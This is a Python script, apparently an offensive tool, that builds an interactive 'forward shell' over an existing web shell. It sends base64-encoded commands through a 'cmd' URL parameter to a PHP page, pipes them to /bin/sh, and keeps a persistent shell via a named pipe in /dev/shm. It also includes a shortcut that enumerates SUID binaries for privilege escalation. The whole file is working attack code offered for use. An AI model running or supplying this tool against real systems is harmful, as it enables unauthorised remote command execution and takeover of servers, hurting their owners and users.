#/bin/python3

import requests
from termcolor import colored
from base64 import b64encode
from random import randrange
import time

class ForwardShell:

    def __init__(self):
        session = randrange(1000, 9999)
        self.stdin = f"/dev/shm/{session}.input"
        self.stdout =  f"/dev/shm/{session}.output"
        self.url = 'http://localhost/index.php'
        self.is_pseudoterminal = False
        self.help_options = {'enum suid': 'FileSystem SUID Privileges Enumeration', 'help': 'Show this help panel'}


   
    def run_command(self, command):

        command = b64encode(command.encode()).decode()

        data = {
            'cmd': 'echo "%s" | base64 -d | /bin/sh ' % command 
        }

        try:
            r = requests.get(self.url, params=data, timeout=5)
            return r.text
        except:
            pass


    def setup_shell(self):

        command = f"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (self.stdin, self.stdin, self.stdout)
        self.run_command(command)


    def remove_data(self):

        remove_data_command = f"/bin/rm {self.stdin} {self.stdout}"
        self.run_command(remove_data_command)

    def read_stdout(self):

        for _ in range(5):
            read_stdout_command = f'/bin/cat {self.stdout}'
            output = self.run_command(read_stdout_command)
            time.sleep(0.2)
        
        return output


    def write_stdin(self, command):

        command = b64encode(command.encode()).decode()

        data = {
            'cmd': 'echo "%s" | base64 -d > %s' % (command, self.stdin)
        }

        r = requests.get(self.url, params=data)


    def clear_stdout(self):

        clear_stdout_command = f'echo "" > {self.stdout}'
        self.run_command(clear_stdout_command)

    
    def run(self):

        self.setup_shell()

        while True:
            command = input(colored("> ", 'yellow'))
            
            if "script /dev/null -c bash" in command:
                print(colored(f'\n[+] You have started a pesudo terminal....\n', 'blue'))
                self.is_pseudoterminal = True

            if command.strip() == 'enum suid':
                command = f'find / -perm -4000 2>/dev/null | xargs ls -l'
        
            if command.strip() == 'help':
                print(colored(f'\n[+] Help Panel: \n', 'yellow'))
                for key, value in self.help_options.items():
                    print(colored(f'\t{key}: {value}', 'blue'))
                print(f'\n')
                continue

            self.write_stdin(command + "\n")
            output = self.read_stdout()
            
            if command.strip() == 'exit':
                self.is_pseudoterminal = False
                print(colored(f'\n[!] You leave the pseudo terminal.....\n', 'red'))
                self.clear_stdout()
                continue

                
            
            if self.is_pseudoterminal:
                lines = output.split('\n')
                
                if len(lines) == 3:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1])
                elif len(lines)>3:
                    cleared_output = '\n'.join([lines[-1]] + lines[:1] + lines[2:-1])

                print('\n' + cleared_output + '\n')
            else:
                print(output)

            self.clear_stdout()


